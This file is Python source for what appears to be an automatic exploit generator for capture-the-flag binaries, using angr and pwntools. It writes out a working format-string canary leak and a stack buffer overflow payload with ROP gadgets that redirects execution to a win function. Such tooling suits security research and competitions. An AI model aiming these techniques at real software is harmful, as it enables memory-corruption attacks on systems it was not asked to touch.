import angr
import os.path
from dataclasses import dataclass
from goals import Goal, WinFunction
from pwn import p64, process, ROP, context
from vulns import Vulnerability, StackBufferOverflow, WinFunctionCall, UnconstrainedPrintf
from binary import Binary
from typing import Optional
from constants import PROCESS_STDOUT_WAIT_TIMEOUT

@dataclass
class ExploitError(Exception):
    message: str

def exploit(binary: Binary, goals: list[Goal], vulns: list[Vulnerability]) -> bytes:
    if binary.pie:
        raise ExploitError("Cannot exploit binaries with PIE yet")

    canary_payloads = None
    if binary.canary:
        canary_payloads = gen_canary_leak_payload(binary, vulns)
        if len(canary_payloads) == 0:
            raise ExploitError("Failed to defect stack canary")

    for goal in goals:
        print(f"Current goal: {goal}")
        try:
            with context.quiet:
                p = process(os.path.abspath(binary.path), cwd=os.path.dirname(binary.path))

                # Leak stack canary if present
                canary = None
                if binary.canary:
                    p.send(canary_payloads[0])

                    # recvall with a timeout but it doesn't force close the connection
                    with p.local(PROCESS_STDOUT_WAIT_TIMEOUT):
                        try:
                            while True:
                                if not p._fillbuffer():
                                    break
                        except EOFError:
                            pass
                    out = p.buffer.get()

                    # Extract canary.
                    canary = int(out.split(b"0x")[-1].split(b"\n")[0].strip(), 16)
                    print(f"canary = 0x{canary:x}")

                # Compute final payload stage
                payload = gen_payload(binary, goal, vulns, canary)

                p.sendline(payload)
                out = p.recvall()
                p.close()

                if b"flag" in out:
                    return out
        except ExploitError as e:
            print(f"Failed to achieve goal: {e}")

    raise ExploitError("No solvable goals")


def gen_canary_leak_payload(binary: Binary, vulns: list[Vulnerability()]) -> list[bytes]:
    res = []
    for vuln in vulns:
        if not isinstance(vuln, UnconstrainedPrintf):
            continue
        res.append(gen_printf_payload(binary, vuln))
    return res


def gen_printf_payload(binary: Binary, vuln: UnconstrainedPrintf) -> bytes:
    rdi = vuln.state.regs.rdi
    format_string = b"%39$p\x00"
    constraint = format_string == vuln.state.memory.load(rdi, len(format_string))
    if not vuln.state.solver.satisfiable(extra_constraints=[constraint]):
        raise ExploitError(f"Failed to constrain printf input to {format_string}")
    vuln.state.solver.add(constraint)
    payload = get_satisfying_input(vuln.state)
    return payload


def gen_payload(binary: Binary, goal: Goal, vulns: list[Vulnerability], canary: Optional[int]) -> bytes:
    if not isinstance(goal, WinFunction):
        raise ExploitError("Only WinFunction goals are supported")

    for vuln in vulns:
        if isinstance(vuln, StackBufferOverflow):
            return gen_stack_buffer_overflow_payload(binary, vuln, goal, canary)
        elif isinstance(vuln, WinFunctionCall):
            return get_satisfying_input(vuln.state)

    raise ExploitError("Payload generation requires a StackBufferOverflow vulnerability")


def gen_stack_buffer_overflow_payload(
    binary: Binary,
    vuln: StackBufferOverflow,
    goal: WinFunction,
    canary: Optional[int]
) -> bytes:
    rop = ROP(binary.elf)
    gadget = rop.find_gadget(["ret"])
    input = vuln.state.solver.eval(vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size), cast_to=bytes)
    payload = input
    if binary.canary:
        payload += b"A" * (vuln.saved_rip_offset - 16) + p64(canary) + b"B" * 8 + p64(gadget.address) + p64(goal.addr)
    else:
        payload += b"A" * vuln.saved_rip_offset + p64(gadget.address) + p64(goal.addr)
    if vuln.max_write_size is not None and len(payload) > vuln.max_write_size:
        raise ExploitError("Payload exceeds vulnerability max write size")
    return payload


def get_satisfying_input(state: angr.SimState) -> bytes:
    # Angr leaves off newlines for some reason (I think...)
    return state.solver.eval(state.posix.stdin.load(0, state.posix.stdin.size), cast_to=bytes) + b"\n"
